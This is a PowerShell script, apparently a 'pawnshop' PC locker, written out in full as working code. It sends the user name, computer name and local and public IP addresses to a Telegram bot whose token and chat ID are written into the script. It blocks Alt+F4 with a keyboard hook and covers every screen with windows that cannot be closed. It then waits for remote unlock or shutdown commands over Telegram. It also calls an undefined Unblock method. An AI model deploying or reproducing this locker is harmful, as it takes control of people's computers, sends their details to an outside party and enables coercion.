# SETTINGS
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$lockFile = "C:\\lock_status.txt"
$unlockCmds = @("/unlock$user", "/unlock$pc")
$shutdownCmds = @("/shutdown$user", "/shutdown$pc")
$lockCmds = @("/lock$user", "/lock$pc")

# STATUS FILE INIT
if (-not (Test-Path $lockFile)) { "locked" | Out-File $lockFile -Force }
$status = Get-Content $lockFile -ErrorAction SilentlyContinue
if ($status -eq "unlocked") { return }
"locked" | Out-File $lockFile -Force

# DOWNLOAD IMAGE
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# TELEGRAM NOTIFICATION
function Send-Telegram {
    try {
        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169' })[0].IPAddress
    } catch { $ipLocal = "n/a" }
    try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }
    $msg = "Pawnshop PC Locked:`nUser: $user`nComputer: $pc`nLocal IP: $ipLocal`nPublic IP: $ipPublic`n`nCommands:`n"
    $msg += ($unlockCmds + $shutdownCmds + $lockCmds) -join "`n"
    $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
}
Send-Telegram

# KEYBOARD BLOCKER (ALT+F4)
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
    private static IntPtr hookId = IntPtr.Zero;
    private static bool altPressed = false;
    private static LowLevelKeyboardProc proc = HookCallback;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    public static void Block() {
        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            if ((Keys)vkCode == Keys.Menu) altPressed = true;
            if ((Keys)vkCode == Keys.F4 && altPressed) return (IntPtr)1;
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# FULLSCREEN IMAGE
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; TopMost = $true;
        Bounds = $screen.Bounds; ShowInTaskbar = $false; KeyPreview = $true;
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{ Image = [System.Drawing.Image]::FromFile($tempImagePath); Dock = 'Fill'; SizeMode = 'StretchImage' }
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
    $form.Controls.Add($pb); $form.Show(); $form
}

# TELEGRAM LISTENER
$offset = 0
try {
    $resp = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
    if ($resp.result.Count -gt 0) { $offset = ($resp.result[-1].update_id + 1) }
} catch {}

$timer = New-Object Windows.Forms.Timer -Property @{ Interval = 3000 }
$script:AllowClose = $false
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $txt = $u.message.text.ToLower()
            if ($unlockCmds -contains $txt) {
                "unlocked" | Out-File $lockFile -Force
                $script:AllowClose = $true
                [Windows.Forms.Application]::Exit()
            } elseif ($shutdownCmds -contains $txt) {
                "unlocked" | Out-File $lockFile -Force
                Stop-Computer -Force
            } elseif ($lockCmds -contains $txt) {
                "locked" | Out-File $lockFile -Force
            }
        }
    } catch {}
})
$timer.Start()

[Windows.Forms.Application]::Run()

$timer.Stop()
[KeyBlocker]::Unblock()
